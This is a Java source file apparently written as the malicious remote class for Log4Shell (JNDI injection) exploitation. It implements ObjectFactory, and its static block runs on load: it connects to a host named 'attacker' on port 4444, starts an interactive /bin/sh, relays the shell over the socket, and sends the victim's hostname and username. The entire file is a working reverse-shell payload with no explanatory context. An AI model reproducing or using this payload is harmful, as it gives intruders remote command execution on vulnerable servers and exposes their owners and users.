import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.Hashtable;

public class Exploit implements ObjectFactory {

    static {
        String host = "attacker";
        String port = "4444";

        try {
            Socket sock = new Socket(host, Integer.parseInt(port));
            Process p = new ProcessBuilder("/bin/sh", "-i")
                .redirectErrorStream(true)
                .start();

            InputStream pi = p.getInputStream();
            OutputStream po = p.getOutputStream();
            InputStream si = sock.getInputStream();
            OutputStream so = sock.getOutputStream();

            String banner = "\n=== Log4Shell Reverse Shell ===\n" +
                "Host: " + java.net.InetAddress.getLocalHost().getHostName() + "\n" +
                "User: " + System.getProperty("user.name") + "\n\n";
            so.write(banner.getBytes());
            so.flush();

            new Thread(() -> {
                try {
                    byte[] buf = new byte[1024];
                    int len;
                    while ((len = si.read(buf)) != -1) {
                        po.write(buf, 0, len);
                        po.flush();
                    }
                } catch (Exception ignored) {}
            }).start();

            new Thread(() -> {
                try {
                    byte[] buf = new byte[1024];
                    int len;
                    while ((len = pi.read(buf)) != -1) {
                        so.write(buf, 0, len);
                        so.flush();
                    }
                } catch (Exception ignored) {}
            }).start();

        } catch (Exception e) {
            System.out.println("Shell connection failed: " + e.getMessage());
        }
    }

    @Override
    public Object getObjectInstance(Object o, Name n, Context c, Hashtable<?, ?> h) {
        return null;
    }
}